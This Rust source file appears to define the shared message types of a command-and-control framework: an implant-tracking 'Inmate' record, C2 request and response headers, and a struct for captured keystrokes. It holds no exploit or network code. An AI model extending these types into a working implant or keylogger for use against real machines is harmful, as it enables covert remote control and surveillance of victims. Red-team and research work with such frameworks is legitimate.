use serde::{Serialize, Deserialize};
pub mod actions;
use actions::{RequestActionType, ResponseActionType};

pub struct Inmate {
    rowid: Option<i64>,
    implant_id: Option<String>,
    implant_type: Option<String>,
    implant_version: Option<String>,
    implant_os: Option<String>,
    implant_arch: Option<String>,
    implant_hostname: Option<String>,
    implant_username: Option<String>,
    implant_ip: Option<String>,
    implant_pid: Option<i64>,
    implant_last_checkin: Option<u32>,
    pending_instruct: Option<String>,
    pending_instruct_type: Option<ResponseActionType>,
}

pub fn add(left: u64, right: u64) -> u64 {
    left + right
}
#[derive(Serialize, Deserialize, Debug)]
pub struct C2Response {
    pub message_headers: ResponseHeaders,
    pub message_content: String,
}
impl C2Response {
    pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType, message_content: String) -> Self {
        C2Response {
            message_headers: ResponseHeaders::new(implant_id, timestamp, action_type),
            message_content,
        }
    }
}
#[derive(Serialize, Deserialize, Debug)]
pub struct ResponseHeaders {
    pub implant_id: String,
    pub timestamp: u64,
    pub action_type: ResponseActionType,
}

impl ResponseHeaders {
    pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType) -> Self {
        ResponseHeaders {
            implant_id,
            timestamp,
            action_type,
        }
    }
}


#[derive(Serialize, Deserialize, Debug)]
pub struct RequestHeaders {
    pub implant_id: String,
    pub timestamp: u64,
    pub action_type: RequestActionType,
}

impl RequestHeaders {
    pub fn new(implant_id: String, timestamp: u64, action_type: RequestActionType) -> Self {
        RequestHeaders {
            implant_id,
            timestamp,
            action_type,
        }
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct C2Request {
    pub message_headers: RequestHeaders,
    pub message_content: String,
}

impl C2Request {
    pub fn new(message_headers: RequestHeaders, message_content: String) -> Self {
        C2Request {
            message_headers,
            message_content,
        }
    }
}
#[derive(Serialize, Deserialize, Debug)]
pub struct Keystrokes {
    pub keys: Vec<String>,
    pub timestamp: u64,
}

impl Keystrokes {
    pub fn new(keys: Vec<String>, timestamp: u64) -> Self {
        Keystrokes { keys, timestamp }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn it_works() {
        let result = add(2, 2);
        assert_eq!(result, 4);
    }
}
